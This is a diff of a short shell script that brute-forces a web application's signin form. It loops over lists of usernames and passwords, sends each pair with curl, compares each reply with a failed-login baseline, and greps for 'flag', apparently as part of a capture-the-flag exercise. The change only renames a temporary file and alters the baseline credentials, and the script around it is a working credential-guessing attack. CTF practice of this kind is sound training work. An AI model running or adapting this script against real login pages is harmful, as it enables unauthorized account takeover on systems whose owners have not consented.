@@ -1,5 +1,5 @@
 #!/bin/sh
-curl -s "http://$1/?page=signin&username=qsdqsd&password=qsd&Login=Login#" > trueone
+curl -s "http://$1/?page=signin&username=a&password=a&Login=Login#" > page
 while IFS='' read -r user; do
 	echo "try user : $user"
 	url1="http://$1/?page=signin&username="
@@ -8,7 +8,7 @@ while IFS='' read -r user; do
 	while IFS='' read -r line; do
 			echo "\ttry password: $line"
 			curl -s "$url1$user$url2$line$url3" > tested
-			DIFF=$(diff trueone tested)
+			DIFF=$(diff page tested)
 			if [ "$DIFF" != "" ]
 			then
 					cat tested | grep "flag"
